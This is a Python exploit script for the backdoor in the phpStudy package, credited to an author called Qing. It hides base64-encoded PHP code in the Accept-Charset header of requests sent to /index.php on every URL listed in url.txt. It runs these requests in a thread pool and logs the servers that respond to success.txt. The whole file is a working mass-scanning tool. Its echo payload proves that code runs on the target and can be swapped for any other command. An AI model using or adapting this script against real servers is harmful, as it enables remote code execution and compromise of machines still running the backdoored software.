#!/usr/bin/env python3
#-*- encoding:utf-8 -*-
# 卿 博客:https://www.cnblogs.com/-qing-/

import base64
import requests
import threading
import threadpool

print("======Phpstudy Backdoor Exploit============\n")
print("===========By  Qing=================\n")
print("=====Blog：https://www.cnblogs.com/-qing-/==\n")

def write_shell(url):
    payload = "echo \"qing\";"
    payload = base64.b64encode(payload.encode('utf-8'))
    payload = str(payload, 'utf-8')
    headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'accept-charset': payload,
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
}
    try:
        r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=30)
        if "qing" in r.text:
            print ('[ + ] BackDoor successful: '+url+'===============[ + ]\n')
            with open('success.txt','a') as f:
                    f.write(url+'\n')
        else:
            print ('[ - ] BackDoor failed: '+url+'[ - ]\n')
    except:
        print ('[ - ] Timeout: '+url+' [ - ]\n')

# url = "http://xxx"
# write_shell(url=url,headers=headers)

def main():
    with open('url.txt','r') as f:
        lines = f.read().splitlines()
        task_pool=threadpool.ThreadPool(5)
        requests=threadpool.makeRequests(write_shell,lines)
    for req in requests:
        task_pool.putRequest(req)
        task_pool.wait() 
if __name__ == '__main__':
    main()

#线程队列部分
# th=[]
# th_num=10
# for x in range(th_num):
#         t=threading.Thread(target=write_shell)
#         th.append(t)
# for x in range(th_num):
#         th[x].start()
# for x in range(th_num):
#         th[x].join()
